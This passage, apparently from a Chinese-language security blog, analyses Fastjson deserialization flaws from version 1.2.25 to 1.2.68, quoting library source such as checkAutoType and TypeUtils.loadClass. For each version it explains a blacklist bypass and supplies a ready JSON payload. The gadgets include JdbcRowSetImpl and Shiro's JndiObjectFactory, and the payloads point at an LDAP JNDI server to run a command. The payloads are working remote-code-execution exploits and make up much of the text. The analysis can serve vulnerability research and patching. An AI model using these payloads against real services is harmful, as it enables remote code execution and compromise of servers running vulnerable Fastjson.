&#123;<br>                <span class="hljs-keyword">return</span> UUID.fromString(strVal);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == URI.class) &#123;<br>                <span class="hljs-keyword">return</span> URI.create(strVal);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == URL.class) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(strVal);<br>                &#125; <span class="hljs-keyword">catch</span> (MalformedURLException var9) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;create url error&quot;</span>, var9);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == Pattern.class) &#123;<br>                <span class="hljs-keyword">return</span> Pattern.compile(strVal);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == Locale.class) &#123;<br>                String[] items = strVal.split(<span class="hljs-string">&quot;_&quot;</span>);<br>                <span class="hljs-keyword">if</span> (items.length == <span class="hljs-number">1</span>) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Locale</span>(items[<span class="hljs-number">0</span>]);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> items.length == <span class="hljs-number">2</span> ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">Locale</span>(items[<span class="hljs-number">0</span>], items[<span class="hljs-number">1</span>]) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">Locale</span>(items[<span class="hljs-number">0</span>], items[<span class="hljs-number">1</span>], items[<span class="hljs-number">2</span>]);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == SimpleDateFormat.class) &#123;<br>                <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">dateFormat</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(strVal, lexer.getLocale());<br>                dateFormat.setTimeZone(lexer.getTimeZone());<br>                <span class="hljs-keyword">return</span> dateFormat;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz != InetAddress.class &amp;&amp; clazz != Inet4Address.class &amp;&amp; clazz != Inet6Address.class) &#123;<br>                <span class="hljs-keyword">if</span> (clazz == File.class) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(strVal);<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == TimeZone.class) &#123;<br>                    <span class="hljs-keyword">return</span> TimeZone.getTimeZone(strVal);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (clazz <span class="hljs-keyword">instanceof</span> ParameterizedType) &#123;<br>                        <span class="hljs-type">ParameterizedType</span> <span class="hljs-variable">parmeterizedType</span> <span class="hljs-operator">=</span> (ParameterizedType)clazz;<br>                        clazz = parmeterizedType.getRawType();<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (clazz == Class.class) &#123; <span class="hljs-comment">//当clazz == Class.class，调用TypeUtils.loadClass(),此时strVal为val对应值</span><br>                        <span class="hljs-keyword">return</span> TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == Charset.class) &#123;<br>                        <span class="hljs-keyword">return</span> Charset.forName(strVal);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == Currency.class) &#123;<br>                        <span class="hljs-keyword">return</span> Currency.getInstance(strVal);<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz == JSONPath.class) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONPath</span>(strVal);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>.........<br></code></pre></td></tr></table></figure><p>进入到TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader())，会对传过来的类名字符串在mappings找对应的缓存类对象，如果没有就加载对象，并添加到 mappings 缓存起来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;<br>    <span class="hljs-keyword">if</span> (className != <span class="hljs-literal">null</span> &amp;&amp; className.length() != <span class="hljs-number">0</span>) &#123;<br>        Class&lt;?&gt; clazz = (Class)mappings.get(className);<span class="hljs-comment">//从map中获取classname</span><br>        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> clazz;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<span class="hljs-comment">//判断classname是否[开头</span><br>            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="hljs-number">1</span>), classLoader);<br>            <span class="hljs-keyword">return</span> Array.newInstance(componentType, <span class="hljs-number">0</span>).getClass();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.startsWith(<span class="hljs-string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="hljs-string">&quot;;&quot;</span>)) &#123;<span class="hljs-comment">//判断classname是否L开头</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">newClassName</span> <span class="hljs-operator">=</span> className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<span class="hljs-comment">//去除classname中开头的L</span><br>            <span class="hljs-keyword">return</span> loadClass(newClassName, classLoader);<span class="hljs-comment">//重新调用loadClass()</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (classLoader != <span class="hljs-literal">null</span>) &#123;<br>                    clazz = classLoader.loadClass(className);<span class="hljs-comment">//加载类</span><br>                    mappings.put(className, clazz);<span class="hljs-comment">//将类添加到map中</span><br>                    <span class="hljs-keyword">return</span> clazz;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable var6) &#123;<br>                var6.printStackTrace();<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">contextClassLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<span class="hljs-comment">//获取ClassLoader</span><br>                <span class="hljs-keyword">if</span> (contextClassLoader != <span class="hljs-literal">null</span> &amp;&amp; contextClassLoader != classLoader) &#123;<br>                    clazz = contextClassLoader.loadClass(className);<span class="hljs-comment">//加载类</span><br>                    mappings.put(className, clazz);<span class="hljs-comment">//将类添加到map中</span><br>                    <span class="hljs-keyword">return</span> clazz;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable var5) &#123;<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                clazz = Class.forName(className);<br>                mappings.put(className, clazz);<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable var4) &#123;<br>                <span class="hljs-keyword">return</span> clazz;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一个JSON对象解析完毕，开始解析第二个JSON对象，重新进入checkAutoType()，因解析第一个JSON时已把 JdbcRowSetImpl 对象缓存到map中，故此处可直接获取到目标类。</p><p>1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 未开启autoTypeSupport,可成功利用</p><p><img src="/image/image-20220909151611298-16627077738143.png" alt="image-20220909151611298"></p><p>1.2.33 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.347 autoTypeSupport开启与否均可成功利用</p><p>checkAutoType源码修改，若autoTypeSupport为true,当目标类在黑名单中，需要目标类不在map中才会抛出异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;<br>    <span class="hljs-keyword">if</span> (typeName == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (typeName.length() &gt;= <span class="hljs-built_in">this</span>.maxTypeNameLength) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.autoTypeSupport || expectClass != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">int</span> i;<br>            String deny;<br>            <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.acceptList.length; ++i) &#123;<br>                deny = <span class="hljs-built_in">this</span>.acceptList[i];<br>                <span class="hljs-keyword">if</span> (className.startsWith(deny)) &#123;<br>                    <span class="hljs-keyword">return</span> TypeUtils.loadClass(typeName, <span class="hljs-built_in">this</span>.defaultClassLoader);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.denyList.length; ++i) &#123;<br>                deny = <span class="hljs-built_in">this</span>.denyList[i];<br>                <span class="hljs-comment">//若目标类在黑名单中且不在map中才会抛出异常</span><br>                <span class="hljs-keyword">if</span> (className.startsWith(deny) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);<br>        <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>            clazz = <span class="hljs-built_in">this</span>.deserializers.findClass(typeName);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> clazz; <span class="hljs-comment">//返回目标类</span><br>            &#125;<br></code></pre></td></tr></table></figure><h5 id="PAYLOAD-3"><a href="#PAYLOAD-3" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">&#123;<br> <span class="hljs-string">&quot;A&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<br> <span class="hljs-string">&quot;B&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-Fastjson-1-2-42"><a href="#3-Fastjson-1-2-42" class="headerlink" title="3 Fastjson &#x3D; 1.2.42"></a>3 Fastjson &#x3D; 1.2.42</h3><h5 id="利用条件：-4"><a href="#利用条件：-4" class="headerlink" title="利用条件："></a>利用条件：</h5><p>Fastjson &lt;&#x3D; 1.2.42 开启autoTypeSupport</p><h5 id="利用链分析：-4"><a href="#利用链分析：-4" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>Fastjson1.2.42将黑名单由字符串直接比对改为了HashCode。checkAutoType()中在黑名单绕过的时候做了一个校验，如果类名以L开头，;结尾，则会用stubstring()去除类名前的第一个L,双写L即可绕过</p><p><img src="/image/image-20220909165153536-16627135155325.png" alt="image-20220909165153536"></p><h5 id="PAYLOAD-4"><a href="#PAYLOAD-4" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//开启autoTypeSupport</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-Fastjson-1-2-43"><a href="#4-Fastjson-1-2-43" class="headerlink" title="4 Fastjson &#x3D; 1.2.43"></a>4 Fastjson &#x3D; 1.2.43</h3><h5 id="利用条件：-5"><a href="#利用条件：-5" class="headerlink" title="利用条件："></a>利用条件：</h5><p>Fastjson &lt;&#x3D; 1.2.43开启autoTypeSupport</p><h5 id="利用链分析：-5"><a href="#利用链分析：-5" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>Fastjson &lt;&#x3D; 1.2.43，checkAutoType()对LL进行了判断，如果类以LL开头，抛出异常,但在TypeUtils.loadClass中，还对[进行了处理，因此又可以通过[来进行绕过</p><p>ParserConfig#checkAutoType()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(className.length() - <span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655701488918567152L</span>) &#123;<br>    <span class="hljs-keyword">if</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655656408941810501L</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br><br>    className = className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>TypeUtils#loadClass()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">return</span> clazz;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="hljs-number">1</span>), classLoader);<br>    <span class="hljs-keyword">return</span> Array.newInstance(componentType, <span class="hljs-number">0</span>).getClass();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (className.startsWith(<span class="hljs-string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="hljs-string">&quot;;&quot;</span>)) &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">newClassName</span> <span class="hljs-operator">=</span> className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> loadClass(newClassName, classLoader);<br>&#125; <br></code></pre></td></tr></table></figure><h5 id="PAYLOAD-5"><a href="#PAYLOAD-5" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//开启autoTypeSupport</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="5Fastjson-1-2-44"><a href="#5Fastjson-1-2-44" class="headerlink" title="5Fastjson &#x3D; 1.2.44"></a>5Fastjson &#x3D; 1.2.44</h3><h5 id="利用链分析：-6"><a href="#利用链分析：-6" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>Fastjson &#x3D; 1.2.44修复了[的绕过，在checkAutoType中进行判断如果类名以[或L开头抛出异常。L[让绕过方法失效，可使用JSON内置payload</p><p><img src="/image/2fd4e3fa452461f51e7ab30b40d2e497.png" alt="preload"></p><h5 id="PAYLOAD-6"><a href="#PAYLOAD-6" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br> <span class="hljs-string">&quot;A&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<br> <span class="hljs-string">&quot;B&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6Fastjson-1-2-47"><a href="#6Fastjson-1-2-47" class="headerlink" title="6Fastjson &#x3D; 1.2.47"></a>6Fastjson &#x3D; 1.2.47</h3><h5 id="利用条件：-6"><a href="#利用条件：-6" class="headerlink" title="利用条件："></a>利用条件：</h5><p>1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 未开启autoTypeSupport</p><p>1.2.33 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32  autoTypeSupport开启或未开启均可利用</p><h5 id="利用链分析：-7"><a href="#利用链分析：-7" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>利用链为上述1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.41中PAYLOAD2利用链</p><h5 id="PAYLOAD-7"><a href="#PAYLOAD-7" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br> <span class="hljs-string">&quot;A&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<br> <span class="hljs-string">&quot;B&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="71-2-48"><a href="#71-2-48" class="headerlink" title="71.2.48 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.67"></a>71.2.48 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.67</h3><h5 id="利用条件：-7"><a href="#利用条件：-7" class="headerlink" title="利用条件："></a>利用条件：</h5><p>1.2.48 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.67 </p><h5 id="利用链分析：-8"><a href="#利用链分析：-8" class="headerlink" title="利用链分析："></a>利用链分析：</h5><p>Fastjson1.2.48修复JSON内置绕过方法，此版本内多为针对黑名单绕过，需要相应组件才可使用</p><h5 id="PAYLOAD-8"><a href="#PAYLOAD-8" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h5><p>fastjson &lt;&#x3D; 1.2.62黑名单绕过：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//依赖</span><br><span class="hljs-comment">//&lt;dependency&gt;</span><br><span class="hljs-comment">//          &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;</span><br><span class="hljs-comment">//          &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;</span><br><span class="hljs-comment">//          &lt;version&gt;x.x&lt;/version&gt;</span><br><span class="hljs-comment">//     &lt;/dependency&gt;</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="hljs-string">&quot;AsText&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;<span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure><p>fastjson &lt;&#x3D; 1.2.66黑名单绕过，需autoTypeSupport属性为true</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="hljs-string">&quot;resourceName&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125; <br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="hljs-string">&quot;metricRegistry&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<span class="hljs-string">&quot;jndiNames&quot;</span>:<span class="hljs-string">&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>&#125; <br><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="hljs-string">&quot;properties:&#123;&quot;</span><span class="hljs-meta">@type</span><span class="hljs-string">&quot;:&quot;</span>java.util.Properties<span class="hljs-string">&quot;,&quot;</span>UserTransaction<span class="hljs-string">&quot;:&quot;</span>ldap:<span class="hljs-comment">//127.0.0.1:1389/Basic/Command/calc&quot;&#125;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="8Fastjson-1-2-68"><a href="#8Fastjson-1-2-68" class="headerlink" title="8Fastjson &#x3D; 1.2.68"></a>8Fastjson &#x3D; 1.2.68</h3><h5 id="利用条件：-8"><a href="#利用条件：-8" class="headerlink" title="利用条件："></a>利用条件：</h5><p>存在相应依赖</p><h5 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析:"></a>利用链分析:</h5><h6 id="1-checkAutoType"><a href="#1-checkAutoType" class="headerlink" title="1.checkAutoType"></a>1.checkAutoType</h6><p>FastJSON1.2.68新引入safeMode，配置safeMode为true,黑白名单均不支持autoType,默认为false,不影响代码调用。经过源码分析，达到以下条件则可通过ParserConfig#checkAutoType()安全校验：</p><p>expectClass为空：</p><ol><li>typeNmae不在denyHashCodes黑名单中（必须条件）</li><li>SafeMode为false（必要条件，默认为false）</li><li>typeName在TypeUtils#mappings中且expectClass为空且typeName不为HashMap且不为expectClass子类</li></ol><p>expectClass不为空：</p><ol><li>typeNmae和expectClass均不在denyHashCodes黑名单中（必须条件）</li><li>autoTypeSupport为false（默认为false）</li><li>expectClass在TypeUtils#mappings中</li><li>typeName不是ClassLoader、DataSource、RowSet的子类</li><li>expectClass不为null，且不为Object.class、Serializable.class、Cloneable.class、Closeable.class、EventListener.class、Iterable.class、Collection.class</li><li>typeName是expectClass的子类</li></ol><p>ParserConfig#checkAutoType()方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 